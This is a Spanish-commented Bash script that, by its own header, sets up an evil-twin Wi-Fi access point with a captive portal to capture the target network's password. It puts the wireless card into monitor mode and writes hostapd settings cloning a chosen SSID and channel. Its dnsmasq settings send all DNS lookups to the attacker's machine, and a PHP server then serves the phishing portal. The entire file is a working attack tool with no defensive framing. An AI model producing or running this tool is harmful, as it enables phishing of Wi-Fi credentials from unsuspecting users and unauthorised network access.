#!/bin/bash
# Herramienta para crear un EvilTwin con portal captivo
# para obtener clave del wifi objetivo
#BY SebastianV1nces

#Colours
verde="\e[0;32m\033[1m"
sincolor="\033[0m\e[0m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
morado="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"
negrita="\e[1m"
#Funcion de salir con CONTROL + C
trap ctrl_c INT
function ctrl_c(){
	
	echo "Saliendo..."
	ifconfig $nic down 2> /dev/null
	airmon-ng stop $nic 2> /dev/null
	iwconfig $nic mode Managed 2> /dev/null
	ifconfig $nic up
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	systemctl start NetworkManager
	cd /
	rm -rf /home/kali/prueba/evilTwin/confiHostapd
	rm -rf /home/kali/prueba/evilTwin/confiDnsmasq
	exit 0
}
echo -e ""
echo -e "${rojo}-----------------------------------------${sincolor}"
echo -e "${rojo}|${sincolor}${morado}[*]${verde}Modo monitor en tu tarjeta de red${sincolor}${morado}[*]${sincolor}${rojo}|${sincolor}"
echo -e "${rojo}-----------------------------------------${sincolor}"
sleep 1.5
echo -e "${negrita}\n\t+ Matando todas las conecciones${sincolor}"

#Matando conecciones
airmon-ng check kill
systemctl stop wpa_supplicant.service
sleep 1

echo -ne "${morado}\t[*]${sincolor}${verde} ELije la NIC >> ${sincolor}" && read  nic

#Activando modo monitor
airmon-ng start $nic > /dev/null 2>&1
sleep 1.5
echo -e "${negrita}\n\t\t+  Iniciando modo monitor${sincolor}"

##Verificando el modo monitor del nic

verificNic=$(iwconfig $nic | grep "Mode" | awk '{print $4}' )

case $verificNic in 

Mode:Monitor)
sleep 1.5
echo -e  "\n\t\t${negrita}+ La interfaz ${rojo}$nic ${sincolor}${negrita}esta activa${sincolor}"
sleep 1
;;
*)
echo "Saliendo"
ifconfig $nic down 
airmon-ng stop $nic 
iwconfig $nic mode Managed 
ifconfig $nic up 
systemctl start NetworkManager
exit
;;
esac

#Archivo hostapd 

clear

echo -e ""
echo -e "${rojo}---------------------------------------${sincolor}"
echo -e "${rojo}|${sincolor}${morado}[*]${verde} Iniciando el hostpad por xterm${sincolor}${morado}[*]${sincolor}${rojo}|${sincolor}"
echo -e "${rojo}---------------------------------------${sincolor}"

echo -ne "${negrita}\n\t\t+ Nombre de la red: >> ${sincolor}" && read red
echo -ne  "${negrita}\n\t\t+ tCanal de la red: >> ${sincolor}"  && read canal

mkdir confiHostapd
cd confiHostapd

echo -e "interface=$nic" > hostapd.conf
echo -e "driver=nl80211" >> hostapd.conf
echo -e "ssid=$red" >> hostapd.conf
echo -e "hw_mode=g" >> hostapd.conf
echo -e "channel=$canal" >> hostapd.conf
echo -e "macaddr_acl=0" >> hostapd.conf
echo -e "auth_algs=1" >> hostapd.conf
echo -e "ignore_broadcast_ssid=0" >> hostapd.conf

killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1

chmod +x hostapd.conf
xterm -geometry 60x30+0600 -e "hostapd hostapd.conf ; bash" &

sleep 2.5


#Creando tablas ip 

ifconfig $nic up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

clear

#Creando archivo dnsmasq

cd .. && mkdir confiDnsmasq && cd confiDnsmasq

echo -e "interface=$nic" > dnsmasq.conf
echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h" >> dnsmasq.conf
echo -e "dhcp-opction=3,192.168.1.1" >> dnsmasq.conf
echo -e "dhcp-opction=6,192.168.1.1" >> dnsmasq.conf
echo -e "server=8.8.8.8" >> dnsmasq.conf
echo -e "log-queries" >> dnsmasq.conf
echo -e "log-dhcp" >> dnsmasq.conf
echo -e "listen-address=127.0.0.1" >> dnsmasq.conf
echo -e "address=/#/192.168.1.1" >> dnsmasq.conf

sleep 2

echo -e ""
echo -e "${rojo}-----------------------------------------------${sincolor}"
echo -e "${rojo}|${sincolor}${morado}[*]${verde} Iniciando el dnsmasq por xterm${sincolor}${morado}[*]${sincolor}${rojo}|${sincolor}"
echo -e "${rojo}-----------------------------------------------${sincolor}"
sleep 1.5
echo -e "\n\t${negrita} [+] Generando  archivo dnsmasq  jugando a las configuraciones \n\t      de red para el servidor dhcp${sincolor}"
sleep 1.5
echo  -e "\n\t${negrita} [+] Iniciando servidor PHP en xterm${sincolor}"

#Ejecutando servicio

killall network-manager dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
chmod +x dnsmasq.conf

cd / && cd /home/kali/prueba/evilTwin/confiDnsmasq && dnsmasq -C dnsmasq.conf -d  &
sleep 1.8
clear

#Servidor local donde se encuntra el portal captivo
xterm -geometry 60+30+900+800 -e 'cd / && cd var/www/html && php -S "192.168.1.1:80"'


